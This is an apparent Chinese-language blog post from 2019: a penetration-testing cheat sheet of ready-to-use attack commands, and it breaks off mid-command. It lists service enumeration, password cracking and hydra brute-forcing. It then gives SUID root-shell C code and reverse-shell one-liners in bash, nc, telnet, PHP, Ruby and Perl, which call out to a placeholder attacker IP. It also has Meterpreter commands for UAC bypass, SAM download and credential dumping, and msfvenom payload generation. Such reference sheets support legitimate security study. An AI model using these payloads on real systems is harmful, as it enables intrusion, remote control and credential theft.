<!DOCTYPE html><html lang="en" data-default-color-scheme="auto"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/favicons/tool-logo.png"><link rel="icon" href="/favicons/favicon.ico"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="msvalidate.01" content="6CDECB7628FCAB6B2809D0BB2021D458"><meta name="google-site-verification" content="-aHgnC4GpgdSy24VC2beoxvaFnCzmcyt_Z8p2ZnILy0"><meta name="theme-color" content="#2f4154"><meta name="author" content="guosec"><meta name="keywords" content="guosec,学习笔记,blog,漏洞复现"><meta name="description" content="枚举 常规枚举 显示详细信息，同步，扫描所有端口，使用所有脚本，不探测主机是否存活 1nmap -vv -Pn -A -sC -sS -T 4 -p- 192.168.1.1 显示详细信息，SYN扫描，版本信息和针对服务的脚本。 1nmap -v -sS -A -T4 192.168.1.1 扫描易受攻击的SMB服务器的Nmap脚本 注意：unsafe &#x3D; 1可能会导致中断 1nmap –scri"><meta property="og:type" content="article"><meta property="og:title" content="小本本--备忘录"><meta property="og:url" content="https://guosec.online/posts/554d428f.html"><meta property="og:site_name" content="InfoSec&#39;s Blog"><meta property="og:description" content="枚举 常规枚举 显示详细信息，同步，扫描所有端口，使用所有脚本，不探测主机是否存活 1nmap -vv -Pn -A -sC -sS -T 4 -p- 192.168.1.1 显示详细信息，SYN扫描，版本信息和针对服务的脚本。 1nmap -v -sS -A -T4 192.168.1.1 扫描易受攻击的SMB服务器的Nmap脚本 注意：unsafe &#x3D; 1可能会导致中断 1nmap –scri"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://ae01.alicdn.com/kf/HTB1NN5aav1H3KVjSZFHq6zKppXaI.jpg"><meta property="article:published_time" content="2019-02-09T09:02:18.000Z"><meta property="article:modified_time" content="2022-07-01T18:40:20.912Z"><meta property="article:author" content="guosec"><meta property="article:tag" content="备忘录"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://ae01.alicdn.com/kf/HTB1NN5aav1H3KVjSZFHq6zKppXaI.jpg"><title>小本本--备忘录 - InfoSec&#39;s Blog</title><link rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css"><link rel="stylesheet" href="/css/main.css"><link id="highlight-css" rel="stylesheet" href="/css/highlight.css"><link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css"><link rel="stylesheet" href="/css/macpanel.css"><link rel="stylesheet" href="/css/hbe.style.css"><script id="fluid-configs">var Fluid=window.Fluid||{};Fluid.ctx=Object.assign({},Fluid.ctx);var CONFIG={hostname:"guosec.online",root:"/",version:"1.9.5",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"left",visible:"hover",icon:""},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!1,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!0,loading_img:"/img/loading.gif",onlypost:!1,offset_factor:2},web_analytics:{enable:!1,follow_dnt:!0,baidu:null,google:{measurement_id:null},tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null,path:"window.location.pathname",ignore_local:!1}},search_path:"/local-search.xml",include_content_in_search:!0};if(CONFIG.web_analytics.follow_dnt){var dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack;Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on"))}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><meta name="generator" content="Hexo 7.0.0"></head><body><header><div class="header-inner" style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/"><strong>InfoSec&#39;s Blog</strong> </a><button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> <span>Home</span></a></li><li class="nav-item"><a class="nav-link" href="/archives/"><i class="iconfont icon-archive-fill"></i> <span>Archives</span></a></li><li class="nav-item"><a class="nav-link" href="/categories/"><i class="iconfont icon-category-fill"></i> <span>Categories</span></a></li><li class="nav-item"><a class="nav-link" href="/tags/"><i class="iconfont icon-tags-fill"></i> <span>Tags</span></a></li><li class="nav-item"><a class="nav-link" href="/links/"><i class="iconfont icon-link-fill"></i> <span>Links</span></a></li><li class="nav-item"><a class="nav-link" href="https://guosec.online/tools-pages/"><i class="iconfont icon-briefcase"></i> <span>Tools</span></a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> <span>About</span></a></li><li class="nav-item" id="search-btn"><a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search"><i class="iconfont icon-search"></i></a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle"><i class="iconfont icon-dark" id="color-toggle-icon"></i></a></li></ul></div></div></nav><div id="banner" class="banner" parallax="true" style="background:url(https://ae01.alicdn.com/kf/HTB1NN5aav1H3KVjSZFHq6zKppXaI.jpg) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="banner-text text-center fade-in-up"><div class="h2"><span id="subtitle" data-typed-text="小本本--备忘录"></span></div><div class="mt-3"><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2019-02-09 17:02" pubdate>February 9, 2019 pm</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 11k words </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 11 mins</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div id="board"><article class="post-content mx-auto"><h1 id="seo-header">小本本--备忘录</h1><p class="note note-info">Last updated on 2 years ago</p><div class="markdown-body"><h2 id="center-枚举-center"><center>枚举</center></h2><h3 id="常规枚举">常规枚举</h3><p>显示详细信息，同步，扫描所有端口，使用所有脚本，不探测主机是否存活</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -vv -Pn -A -sC -sS -T 4 -p- 192.168.1.1<br></code></pre></td></tr></table></figure><p>显示详细信息，SYN扫描，版本信息和针对服务的脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -v -sS -A -T4 192.168.1.1<br></code></pre></td></tr></table></figure><p>扫描易受攻击的SMB服务器的Nmap脚本</p><p>注意：unsafe = 1可能会导致中断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 [host]<br></code></pre></td></tr></table></figure><p>获取同网段其他主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bah">netdiscover -r 192.168.1.0/24<br></code></pre></td></tr></table></figure><h3 id="FTP-21">FTP (21)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.1.1<br></code></pre></td></tr></table></figure><h3 id="SSH-22">SSH (22)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh [ip] 22<br></code></pre></td></tr></table></figure><h3 id="SMTP-25">SMTP (25)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 192.168.1.1<br><br>nc -nvv [ip] 25<br><br>telnet [ip] 25<br></code></pre></td></tr></table></figure><h3 id="Web-80-443">Web (80/443)</h3><p>birbuster(GUI)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb http://192.168.1.1/<br><br>nikto -h 192.168.1.1<br></code></pre></td></tr></table></figure><h3 id="Pop3-110">Pop3 (110)</h3><p>telnet [ip] 110</p><p>USER [username]</p><p>PASS [password]</p><p>列出信息 <code>LIST</code></p><p>查找邮件 <code>RETR [message number]</code></p><h3 id="RPCBind-111">RPCBind (111)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcinfo –p 192.168.1.1<br></code></pre></td></tr></table></figure><h3 id="SMB-RPC-139-445">SMB\RPC (139/445)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bahs">enum4linux –a 192.168.1.1<br></code></pre></td></tr></table></figure><p>枚举子网上的Windows/Samba服务器，查找Windows MAC地址，netbios名称并发现客户端工作组/域</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nbtscan 192.168.1.1<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.1.1<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap IPADDR --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse<br></code></pre></td></tr></table></figure><p>列出Ipc共享</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -L //192.168.1.X/<br><br>smbclient //192.168.1.X/ipc$ -U user<br></code></pre></td></tr></table></figure><h3 id="SNMP-161">SNMP (161)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 10.0.0.0<br><br>snmpcheck -t 192.168.1.X -c public<br><br>onesixtyone -c names -i hosts<br><br>nmap -sT -p 161 192.168.X.X -oG snmp_results.txt<br><br>snmpenum -t 192.168.1.X<br></code></pre></td></tr></table></figure><h3 id="Oracle-1521">Oracle (1521)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">tnscmd10g version -h 192.168.X.X<br><br>tnscmd10g status -h 192.168.X.X<br></code></pre></td></tr></table></figure><h3 id="Mysql-3306">Mysql (3306)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -Pn -vv  192.168.1.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122<br></code></pre></td></tr></table></figure><h3 id="DNS区域传输">DNS区域传输</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nslookup -&gt; <span class="hljs-built_in">set</span> <span class="hljs-built_in">type</span>=any -&gt; <span class="hljs-built_in">ls</span> -d baidu.com<br><br>dig axfr baidu.com @ns1.baidu.com<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml<br></code></pre></td></tr></table></figure><h3 id="挂载文件共享">挂载文件共享</h3><p><code>showmount -e</code></p><p>将共享挂载到/ mnt / nfs而不锁定它</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount 192.168.1.1:/vol/share /mnt/nfs  -nolock<br></code></pre></td></tr></table></figure><p>在Linux上挂载Windows CIFS/SMB共享位于/mnt/cifs如果删除密码，它将在CLI上提示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount -tcifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs<br></code></pre></td></tr></table></figure><h3 id="指纹识别">指纹识别</h3><p>通过显示横幅进行基本版本控制/指纹识别</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -v 192.168.1.1 25<br><br>telnet 192.168.1.1 25<br></code></pre></td></tr></table></figure><h3 id="搜索利用exp">搜索利用exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit windows 2003 | grep -i <span class="hljs-built_in">local</span><br></code></pre></td></tr></table></figure><h3 id="编译EXP">编译EXP</h3><p>编译C代码，在’gcc’之后添加<code>-m32</code>，用于在64位Linux上编译32位代码,不添加则编译64位的exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -o exploit exploit.c<br></code></pre></td></tr></table></figure><p>在Linux上编译windows .exe</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe<br></code></pre></td></tr></table></figure><h3 id="检测数据包">检测数据包</h3><p>tcpdump用于接口eth0上的端口80，输出到output.pcap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcpdump tcp port 80 -w output.pcap -i eth0<br></code></pre></td></tr></table></figure><h3 id="密码破解">密码破解</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">hash-identifier [<span class="hljs-built_in">hash</span>]<br><br>john hashes.txt<br><br>hashcat -m 500 -a 0 -o output.txt –remove hashes.txt /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><p><a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br><a target="_blank" rel="noopener" href="https://hashkiller.co.uk/">https://hashkiller.co.uk/</a></p><h3 id="暴力破解">暴力破解</h3><p>web post表单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra 10.0.0.1 http-post-form “/admin.php:target=auth&amp;mode=login&amp;user=^USER^&amp;password=^PASS^:invalid” -P /usr/share/wordlists/rockyou.txt -l admin<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt -o results.txt [ip] [协议]<br></code></pre></td></tr></table></figure><p>爆破SMTP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp –V<br></code></pre></td></tr></table></figure><h2 id="center-Shells-Reverse-Shells-center"><center>Shells &amp; Reverse Shells</center></h2><h3 id="SUID-C-Shells">SUID C Shells</h3><p><strong>/bin/bash</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>system(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>/bin/sh</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="TTY-Shell">TTY Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><br><span class="hljs-built_in">echo</span> os.system(<span class="hljs-string">&#x27;/bin/bash&#x27;</span>)<br><br>/bin/sh –i<br><br>execute(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br><br>!sh <span class="hljs-comment">#nmap</span><br><br><span class="hljs-string">&quot;!bash #vi</span><br></code></pre></td></tr></table></figure><h3 id="Spawn-Ruby-Shell">Spawn Ruby Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span><br><br>ruby -rsocket -e<span class="hljs-string">&#x27;f=TCPSocket.open(&quot;ATTACKING-IP&quot;,80).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d</span><br></code></pre></td></tr></table></figure><h3 id="Netcat">Netcat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/sh ATTACKING-IP 80<br><br>/bin/sh | nc ATTACKING-IP 80<br><br><span class="hljs-built_in">rm</span> -f /tmp/p; <span class="hljs-built_in">mknod</span> /tmp/p p &amp;&amp; nc ATTACKING-IP 4444 0/tmp/p<br></code></pre></td></tr></table></figure><h3 id="telnet反弹Shell">telnet反弹Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -f /tmp/p; <span class="hljs-built_in">mknod</span> /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p<br><br>telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443<br></code></pre></td></tr></table></figure><h3 id="PHP">PHP</h3><p>假设TCP使用文件描述符3.如果它不起作用，请尝试4,5或6）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;ATTACKING-IP&quot;,80);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="Bash">Bash</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> /bin/bash 0&amp;0 2&gt;&amp;0<br><br>0&lt;&amp;196;<span class="hljs-built_in">exec</span> 196&lt;&gt;/dev/tcp/ATTACKING-IP/80; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196<br><br><span class="hljs-built_in">exec</span> 5&lt;&gt;/dev/tcp/ATTACKING-IP/80 <span class="hljs-built_in">cat</span> &lt;&amp;5 | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line; <span class="hljs-keyword">do</span> <span class="hljs-variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="hljs-keyword">done</span><br><br>bash -i &gt;&amp; /dev/tcp/ATTACKING-IP/80 0&gt;&amp;1<br></code></pre></td></tr></table></figure><h3 id="Perl">Perl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br><br>perl —e <span class="hljs-string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br><br>perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;ATTACKING-IP&quot;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><br>perl -MIO -e <span class="hljs-string">&#x27;$c=new IO::Socket::INET(PeerAddr,&quot;ATTACKING-IP:80&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br><br>perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;ATTACKING-IP&quot;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="center-Meterpreter-center"><center>Meterpreter</center></h2><h3 id="Windows">Windows</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><h3 id="Windows-VNV">Windows VNV</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/vncinject/reverse_tcp<br><br><span class="hljs-built_in">set</span> ViewOnly <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h3 id="Linux">Linux</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload linux/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><h3 id="msf备忘">msf备忘</h3><p>上传文件</p><p><code>upload file c:\\windows</code></p><p>下载文件</p><p><code>download c:\\windows\\repair\\sam /tmp</code></p><p>运行exe</p><p><code>execute -f c:\\windows\temp\exploit.exe</code></p><p>使用cmd shell创建新通道</p><p><code>execute -f cmd -c</code></p><p>端口转发</p><p><code>portfwd add –l 3389 –p 3389 –r target</code></p><p>关闭端口转发</p><p><code>portfwd delete –l 3389 –p 3389 –r target</code></p><p>Bypass UAC</p><p><code>use exploit/windows/local/bypassuac</code></p><p>HTTP目录扫描</p><p><code>use auxiliary/scanner/http/dir_scanner</code></p><p>扫描JBOSS漏洞</p><p><code>use auxiliary/scanner/http/jboss_vulnscan</code></p><p>扫描MSSQL密码</p><p><code>use auxiliary/scanner/mssql/mssql_login</code></p><p>扫描MSSQL版本</p><p><code>use auxiliary/scanner/mysql/mysql_version</code></p><p>Oracle登录模块</p><p><code>use auxiliary/scanner/oracle/oracle_login</code></p><p>powershell有效负载模块</p><p><code>use exploit/multi/script/web_delivery</code></p><p>通过会话上传和运行powershell脚本</p><p><code>post/windows/manage/powershell/exec_powershell</code></p><p>部署JBOSS</p><p><code>use exploit/multi/http/jboss_maindeployer</code></p><p>MSSQL有效负载</p><p><code>use exploit/windows/mssql/mssql_payload</code></p><p>显示当前用户的权限</p><p><code>run post/windows/gather/win_privs</code></p><p>抓取GPP保存的密码</p><p><code>use post/windows/gather/credentials/gpp</code></p><p>加载Mimikatz/kiwi并获得凭证</p><p><code>load kiwi</code></p><p><code>creds_all</code></p><p>识别所提供的域用户具有管理访问权限的其他计算机</p><p><code>run post/windows/gather/local_admin_search_enum</code></p><p><code>set AUTORUNSCRIPT post/windows/manage/migrate</code></p><h3 id="msf-payloads">msf payloads</h3><p>列出选项</p><p><code>msfvenom –l</code></p><h3 id="二进制">二进制</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf &gt; shell.elf<br><br>msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe<br><br>msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho &gt; shell.macho<br></code></pre></td></tr></table></figure><h3 id="Web-payloads">Web payloads</h3><p>PHP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -f raw &gt; shell.php<br><br><span class="hljs-built_in">cat</span> shell.php | pbcopy &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php &#x27;</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php<br></code></pre></td></tr></table></figure><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload php/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><p>ASP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &gt; shell.asp<br></code></pre></td></tr></table></figure><p>JSP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw &gt; shell.jsp<br></code></pre></td></tr></table></figure><p>WAR</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p 